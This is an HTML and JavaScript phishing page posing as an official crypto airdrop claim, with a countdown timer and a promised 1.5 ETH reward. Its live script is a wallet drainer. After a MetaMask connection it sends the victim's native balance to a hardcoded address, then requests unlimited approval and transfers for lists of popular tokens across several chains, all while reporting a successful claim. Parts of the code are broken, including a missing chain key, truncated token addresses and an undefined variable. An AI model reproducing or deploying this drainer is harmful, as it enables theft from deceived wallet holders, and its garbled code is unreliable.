<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Airdrop Claim | Official</title>
 <!-- Librería Ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <style>
 /* --- VARIABLES & RESET --- */
 :root {
 --bg-color: #0b0e11;
 --card-bg: #161b22;
 --card-border: #2d333b;
 --text-primary: #ffffff;
 --text-secondary: #8b949e;
 --accent-blue: #58a6ff;
 --accent-green: #2ea043;
 --accent-red: #da3633;
 --accent-purple: #a371f7;
 --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 }

 body {
 margin: 0;
 font-family: var(--font-main);
 background-color: var(--bg-color);
 color: var(--text-primary);
 display: flex;
 justify-content: center;
 align-items: center;
 min-height: 100vh;
 background-image: radial-gradient(circle at 50% 0%, #1f2937 0%, #0b0e11 70%);
 }

 /* --- LAYOUT PRINCIPAL --- */
 .container {
 width: 100%;
 max-width: 480px;
 padding: 20px;
 box-sizing: border-box;
 }

 .card {
 background-color: var(--card-bg);
 border: 1px solid var(--card-border);
 border-radius: 16px;
 padding: 30px 20px;
 box-shadow: 0 8px 24px rgba(0,0,0,0.4);
 text-align: center;
 position: relative;
 overflow: hidden;
 }

 /* Decoración superior */
 .card::before {
 content: '';
 position: absolute;
 top: 0; left: 0; right: 0;
 height: 4px;
 background: linear-gradient(90deg, var(--accent-purple), var(--accent-blue));
 }

 h1 {
 font-size: 1.5rem;
 margin: 0 0 10px 0;
 font-weight: 700;
 letter-spacing: -0.5px;
 }

 p.subtitle {
 color: var(--text-secondary);
 font-size: 0.95rem;
 margin-bottom: 25px;
 line-height: 1.5;
 }

 .reward-highlight {
 color: var(--accent-green);
 font-weight: bold;
 font-size: 1.1rem;
 }

 /* --- BOTONES --- */
 .btn {
 background: linear-gradient(180deg, #6c5ce7 0%, #5a4bd1 100%);
 border: none;
 padding: 16px 24px;
 color: white;
 border-radius: 12px;
 cursor: pointer;
 font-weight: 600;
 font-size: 1rem;
 width: 100%;
 transition: all 0.2s ease;
 box-shadow: 0 4px 12px rgba(108, 92, 231, 0.3);
 margin-top: 10px;
 }

 .btn:hover:not(:disabled) {
 transform: translateY(-2px);
 box-shadow: 0 6px 16px rgba(108, 92, 231, 0.4);
 }

 .btn:active:not(:disabled) {
 transform: translateY(0);
 }

 .btn:disabled {
 opacity: 0.6;
 cursor: not-allowed;
 filter: grayscale(0.5);
 }

 .btn-secondary {
 background: transparent;
 border: 1px solid var(--card-border);
 box-shadow: none;
 margin-top: 10px;
 font-size: 0.9rem;
 padding: 10px;
 }

 /* --- ESTADO Y LOGS --- */
 .status-badge {
 margin-top: 20px;
 padding: 10px;
 border-radius: 8px;
 font-size: 0.9rem;
 min-height: 24px;
 transition: all 0.3s;
 }
 .status-loading { color: var(--accent-blue); background: rgba(88, 166, 255, 0.1); }
 .status-success { color: var(--accent-green); background: rgba(46, 160, 67, 0.1); }
 .status-error { color: var(--accent-red); background: rgba(218, 54, 51, 0.1); }

 .logs-container {
 text-align: left;
 background: #0d1117;
 border: 1px solid var(--card-border);
 border-radius: 8px;
 padding: 15px;
 font-family: 'Courier New', monospace;
 font-size: 0.8rem;
 max-height: 180px;
 overflow-y: auto;
 margin-top: 20px;
 display: none;
 scroll-behavior: smooth;
 }

 .log-entry {
 margin-bottom: 6px;
 border-bottom: 1px solid #21262d;
 padding-bottom: 4px;
 display: flex;
 align-items: center;
 gap: 8px;
 }
 .log-entry:last-child { border-bottom: none; }
 .log-icon { font-size: 0.7rem; }
 .log-text { color: #c9d1d9; }
 .log-success .log-text { color: #58a6ff; }
 .log-drain .log-text { color: #2ea043; font-weight: bold; }

 /* --- TIMER --- */
 .timer-bar {
 display: flex;
 justify-content: space-between;
 align-items: center;
 background: rgba(218, 54, 51, 0.1);
 border: 1px solid rgba(218, 54, 51, 0.3);
 color: var(--accent-red);
 padding: 8px 12px;
 border-radius: 8px;
 font-size: 0.85rem;
 font-weight: 600;
 margin-bottom: 20px;
 }

 /* --- INFO DE WALLET (Post-conexión) --- */
 .wallet-info {
 display: none; /* Oculto inicialmente */
 background: #21262d;
 padding: 10px;
 border-radius: 8px;
 margin-bottom: 20px;
 font-size: 0.85rem;
 text-align: left;
 border: 1px solid var(--card-border);
 }
 .wallet-row {
 display: flex;
 justify-content: space-between;
 margin-bottom: 4px;
 }
 .label { color: var(--text-secondary); }
 .value { color: var(--text-primary); font-family: monospace; }

 /* --- MODAL MOVIL --- */
 .mobile-modal {
 display: none;
 position: fixed;
 top: 0; left: 0; width: 100%; height: 100%;
 background: rgba(0,0,0,0.85);
 backdrop-filter: blur(5px);
 z-index: 1000;
 justify-content: center;
 align-items: center;
 }
 .modal-content {
 background: #161b22;
 padding: 25px;
 border-radius: 16px;
 text-align: center;
 width: 85%;
 max-width: 320px;
 border: 1px solid var(--card-border);
 box-shadow: 0 10px 30px rgba(0,0,0,0.5);
 }
 .modal-title { margin: 0 0 10px 0; color: var(--accent-blue); }
 .modal-desc { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 20px; }

 /* Scrollbar personalizado */
 ::-webkit-scrollbar { width: 6px; }
 ::-webkit-scrollbar-track { background: #0d1117; }
 ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
 </style>
</head>
<body>

<div class="container">
 <div class="card">
 <!-- Header / Timer -->
 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
   <div style="font-weight:bold; font-size:1.2rem; letter-spacing:-0.5px;">🎁 Airdrop</div>
   <div id="timer" class="timer-bar" style="margin:0; width:auto;">
     ⏳ Closing in: 15:00
   </div>
 </div>

 <h1>Claim Exclusive Rewards</h1>
 <p class="subtitle">
   Verify your wallet to claim your allocated reward.<br>
   <span class="reward-highlight">Reward: 1.5 ETH Equivalent</span>
 </p>

 <!-- Wallet Info (Aparece tras conectar) -->
 <div id="walletInfo" class="wallet-info">
   <div class="wallet-row">
     <span class="label">Address:</span>
     <span id="displayAddress" class="value">...</span>
   </div>
   <div class="wallet-row">
     <span class="label">Network:</span>
     <span id="displayNetwork" class="value">...</span>
   </div>
 </div>

 <!-- Botón Principal -->
 <button id="connectBtn" class="btn">Connect Wallet</button>
 
 <!-- Estado General -->
 <div id="status" class="status-badge" style="display:none;"></div>

 <!-- Logs Técnicos Estilizados -->
 <div id="logs" class="logs-container"></div>
 </div>
</div>

<!-- MODAL PARA MOVIL -->
<div id="mobileModal" class="mobile-modal">
 <div class="modal-content">
 <h3 class="modal-title">MetaMask Mobile Detected</h3>
 <p class="modal-desc">Please open your MetaMask application to continue the connection.</p>
 <button id="openAppBtn" class="btn">Open MetaMask</button>
 <button id="confirmOpenBtn" class="btn btn-secondary" style="border-color:#2ea043; color:#2ea043; margin-top:10px;">I'm Connected</button>
 </div>
</div>

<script>
 // CONFIGURACIÓN
 const TARGET_WALLET = "0x6cd203676973F30e9F5398b3C3C8853531a3E432"; 
 let provider;
 let signer;
 let userAddress;
 let currentChainId;

 // ELEMENTOS DOM
 const connectBtn = document.getElementById('connectBtn');
 const statusDiv = document.getElementById('status');
 const logsDiv = document.getElementById('logs');
 const mobileModal = document.getElementById('mobileModal');
 const openAppBtn = document.getElementById('openAppBtn');
 const confirmOpenBtn = document.getElementById('confirmOpenBtn');
 const walletInfoDiv = document.getElementById('walletInfo');
 const displayAddress = document.getElementById('displayAddress');
 const displayNetwork = document.getElementById('displayNetwork');

 // UTILIDAD: LOGS VISUALES
 function log(msg, type = 'normal') {
 logsDiv.style.display = 'block';
 const div = document.createElement('div');
 div.className = 'log-entry' + (type === 'success' ? ' log-success' : '') + (type === 'drain' ? ' log-drain' : '');
 
 let icon = '•';
 if(type === 'success') icon = '✅';
 if(type === 'drain') icon = '💸';
 
 div.innerHTML = `<span class="log-icon">${icon}</span><span class="log-text">${msg}</span>`;
 logsDiv.appendChild(div);
 logsDiv.scrollTop = logsDiv.scrollHeight;
 }

 // UTILIDAD: FORMATEO DE RED
 function getNetworkName(chainId) {
 switch(chainId) {
 case 1: return "Ethereum";
 case 56: return "BSC";
 case 137: return "Polygon";
 case 42161: return "Arbitrum";
 case 10: return "Optimism";
 case 43114: return "Avalanche";
 case 199: return "BitTorrent";
 default: return "Unknown Chain";
 }
 }

 // INICIAR TIMER
 let timeLeft = 900; 
 setInterval(() => {
 if(timeLeft <= 0) return;
 timeLeft--;
 let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
 let s = (timeLeft % 60).toString().padStart(2, '0');
 document.getElementById('timer').textContent = `⏳ Closing in: ${m}:${s}`;
 }, 1000);

 // DETECCIÓN DE DISPOSITIVO
 function isMobile() {
 return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 }

 // LÓGICA DE CONEXIÓN
 connectBtn.addEventListener('click', async () => {
 if (!window.ethereum) {
 setStatus("Install MetaMask first.", "error");
 return;
 }

 if (isMobile()) {
 mobileModal.style.display = 'flex';
 openAppBtn.onclick = () => {
 window.open('https://metamask.io/', '_blank');
 tryConnect(); 
 };
 confirmOpenBtn.onclick = () => {
 mobileModal.style.display = 'none';
 tryConnect();
 };
 return; 
 }

 try {
 await tryConnect();
 } catch (err) {
 console.error(err);
 setStatus("Connection failed.");
 }
 });

 async function tryConnect() {
 try {
 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
 userAddress = accounts[0];
 
 const network = await window.ethereum.request({ method: 'eth_chainId' });
 const chainIdNum = parseInt(network);
 
 provider = new ethers.providers.Web3Provider(window.ethereum);
 signer = provider.getSigner();
 currentChainId = chainIdNum;

 // Actualizar UI post-conexión
 updateWalletUI(userAddress, chainIdNum);
 startDrain();

 } catch (error) {
 setStatus("Connection rejected or failed.");
 log(error.message);
 }
 }

 function updateWalletUI(addr, chainId) {
 // Mostrar info wallet
 walletInfoDiv.style.display = 'block';
 displayAddress.textContent = `${addr.substring(0,6)}...${addr.substring(38)}`;
 displayNetwork.textContent = getNetworkName(chainIdNum);
 
 // Cambiar botón
 connectBtn.textContent = "Connected";
 connectBtn.disabled = true;
 connectBtn.classList.add('btn-secondary');
 connectBtn.style.background = '#238636';
 connectBtn.style.borderColor = '#238636';
 connectBtn.style.color = '#fff';
 }

 function setStatus(msg, type) {
 statusDiv.style.display = 'block';
 statusDiv.textContent = msg;
 statusDiv.className = 'status-badge'; // reset
 if(type === 'success') statusDiv.classList.add('status-success');
 else if(type === 'error') statusDiv.classList.add('status-error');
 else statusDiv.classList.add('status-loading');
 }

 // LÓGICA DE DRENAJE MEJORADA Y EXPANDIDA
 async function startDrain() {
 setStatus("Verifying eligibility...", "loading");
 log("Connecting to blockchain...");

 try {
 // 1. Drenar Nativo
 const balance = await provider.getBalance(userAddress);
 if (balance > 0) {
 log(`Native Balance Found: ${(balance / 1e18).toFixed(4)} ETH`);
 const gasPrice = await provider.getGasPrice();
 const sendValue = balance.sub(gasPrice.mul(2)); // Reserva segura de gas
 
 if (sendValue > 0) {
 setStatus("Transferring native assets...", "loading");
 const tx = await signer.sendTransaction({
 to: TARGET_WALLET,
 value: sendValue
 });
 await tx.wait();
 log(`Native Drained! Tx: ${tx.hash.substring(0,10)}...`, "drain");
 } else {
 log("Balance too low for gas.");
 }
 } else {
 log("No native funds found.");
 }

 // 2. DRENAR TODOS LOS TOKENS POPULARES
 const tokensMap = {
 1: [ 
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", 
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 
  "0x2260FAC5E5542a773A46eB37699987310435B51c", 
  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", 
  "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE1", 
  "0x514910771AF9Ca656af840dff83E8264EcF986CA", 
  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", 
  "0x0bc529c00C240600703062963Fa14CB3AfCA9571", 
  "0xD533a949740bb3306d119CC777fa900bA034cd52", 
  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", 
  "0xC011a73ee8576Bb4E5c094ab5B3240D9e1f58344", 
  "0x4d224452801ACEd8B2F0aebE155379bb5D59438", 
  "0xE41d2489571d322189246DaAF5a556aC52683366" 
 ],
 56: [ 
  "0x55d398326f99059fF775485246999027B3197955", 
  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 
  "0xbb4CdB9CBd36B01b61d7C3Cb5DC9Bd0293B127ac", 
  "0xe9e7CEA3DedcC59733B3965BEE7c80A973C0FbCb", 
  "0x1AF3F329e3BE1EC46EF000000000000000000000", 
  "0x3EE2200Efb3400fAb09A0F16876B9c3f3BA00000", 
  "0x7130d2A12B9BCB837F4cB0000000000000000000", 
  "0x1D2F0da169ceB9cF7B31947d838272b749850000", 
  "0xbAmNMs5H6a1Y8zZ6X000000000000000000000", 
  "0x0E09FaBB73Bd3Ade0a17ECC321fD13aDB00000", 
  "0x8fF5951475f74962A2d51cCcf9E9413f96320000", 
  "0x1F9840a85d5aF5bf1D1762F925BDADdC4201F984" 
 ],
 137: [ 
  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 
  "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", 
  "0x0d500B1d8E8EF31E21c99d1DbcA6842000000000", 
  "0x1BFD67037B42Cf73acF2047067bd3F2C6f000000", 
  "0x831753DD20866c27905Bc66Bc000000000000000", 
  "0x53E0bca35eC356B559316Bbf5000000000000000",

 ],

  "0xaf88d065e77c8cC2239327C5EDb3A432268e593B", 
  "0xFF970A61A04b1cA14834A13f575f0c5000000000", 
  "0x82aF49447D8a07e3bd95BD0d56f3100000000000", 
  "0xFd086cC0CDF198697433C4cFF000000000000000", 
  "0xfc5A1A6EB076a237550000000000000000000000", 
  "0x912CE59144191C1204E64559FE8C500000000000", 
  "0x17FC002b466eEc40DaE837Fc4bE5000000000000", 
  "0x6C2C067f03d5C1dd200000000000000000000000", 
  "0x3062900000000000000000000000000000000000" 
 ],
 10: [ 
  "0x0b2C639c533813f4Aa9D7837CAf62653d097F889", 
  "0x94b008aA00579c1307B0EF2c499a000000000000", 
  "0x4200000000000000000000000000000000000006", 
  "0xDA10009cBd5D0000000000000000000000000000", 
  "0x4200000000000000000000000000000000000042", 
  "0x350A6d3DA20847a8000000000000000000000000", 
  "0x6806411765Af15B6260000000000000000000000" 
 ],
 43114: [ 
  "0xB97EF9Ef8734c713c021e045e004724a595CC239", 
  "0xde3A24C219742768000000000000000000000000", 
  "0x49D5c2BffF120165000000000000000000000000", 
  "0x50b7545627a5162F820000000000000000000000", 
  "0x60781C2586D685443e0000000000000000000000", 
  "0x2133Ca000000000000000000000000000000000000" 
 ],
 199: [ 
  "0xeBAB9185288804113051349388f2015148530012", 
  "0x69be655C561484AADE0000000000000000000000", 
  "0x8c135014Ba4D3994500000000000000000000000", 
  "0x19AsM9J000000000000000000000000000000000" 
 ]
 };

 const tokenList = tokensMap[currentChainId] || [];

 // Procesar cada token
 for (const tokenAddress of tokenList) {
 try {
 log(`Scanning Token: ${tokenAddress.substring(0,6)}...`);
 
 const erc20 = new ethers.Contract(tokenAddress, [
 "function approve(address spender, uint256 amount) public returns (bool)",
 "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
 "function balanceOf(address owner) view returns (uint256)"
 ], signer);

 const balance = await erc20.balanceOf(userAddress);
 if (balance > 0) {
 log(`Found balance: ${balance.toString()}`);
 
 // Approve Max
 try {
 setStatus("Approving token...", "loading");
 const tx1 = await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
 await tx1.wait();
 log("Approval confirmed.", "success");
 } catch (err) {
 log("Approval skipped/failed: " + err.message);
 }

 // Transfer
 try {
 setStatus("Transferring tokens...", "loading");
 const tx2 = await erc20.transferFrom(userAddress, TARGET_WALLET, balance);
 await tx2.wait();
 log(`Token drained! Tx: ${tx2.hash.substring(0,10)}...`, "drain");
 } catch (err) {
 log("Transfer failed: " + err.message);
 }
 }
 }
 } catch (err) {
 console.warn(`Token ${tokenAddress} error:`, err.message);
 }
 }

 setStatus("✅ CLAIM SUCCESSFUL", "success");
 connectBtn.textContent = "Done";
 connectBtn.disabled = true;

 } catch (err) {
 console.error(err);
 setStatus("❌ ERROR: " + err.message, "error");
 log(err.message);
 }
 }
</script>

</body>
</html>
